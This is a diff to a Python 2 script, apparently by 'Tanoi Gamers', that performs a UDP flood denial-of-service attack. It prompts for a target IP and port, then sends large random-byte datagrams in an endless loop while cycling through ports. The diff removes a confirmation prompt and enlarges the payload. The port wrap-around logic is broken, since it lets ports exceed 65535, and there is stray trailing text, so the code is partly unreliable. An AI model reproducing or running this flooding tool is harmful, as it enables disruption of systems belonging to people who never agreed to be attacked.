@@ -16,46 +16,63 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+###################################################
+"""
+Code Sock and Code bytes
+"""
+############################################################
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
+###########################################################
+bytes = random._urandom(12550)
+#########################################################
+#######################################################
+#####################################################
+###################################################
+####### Creat By Tanoi Gamers. ##################
+###### Script that is DDOS [IP]################
+#############################################
+###########################################
 os.system("clear")
 os.system("figlet DDOSTN")
-print
+print "\033[35m"
 print "Creator  : Tanoi Gamers"
-print "Codename : TN-01"
-print "Version  : 0.1"
-print "IDgithub : https://github.com/Tanoi-Gamers-673-x"
+print "Codename : TN-02"
+print "Version  : 0.2"
+print "github   : https://github.com/Tanoi-Gamers-673-x"
 print
-print "Please confirm that you will proceed."
-print
-quit = raw_input("Y/N : ")
+print "\033[37m"
 ip = raw_input("IP Target@ : ")
 port = input("Port       : ")
-
-os.system("clear")
 print
-os.system("figlet DDos Starting")
+os.system("clear")
+print "\033[35m"
+print
+os.system("figlet -f slant DDOS Starting | lolcat -a")
 print "\033[1m\033[32m Tanoi Gamers"
-print "\033[0m"
+print "\033[56m"
 print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
 time.sleep(3)
+print "[=====               ] 25%"
+time.sleep(3)
+print "[==========          ] 50%"
+time.sleep(3)
+print "[===============     ] 75%"
+time.sleep(3)
+print "[====================] 100%"
+time.sleep(1)
 sent = 0
+
+print "\033[33m"
+
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+     print "Attack %s Packet to %s port :~# %s" % (sent,ip,port)
+     if port == 99999:
+       port = 80
+
+else :
+ print "\n[ERROR SYSTEM]\n"
+up
 
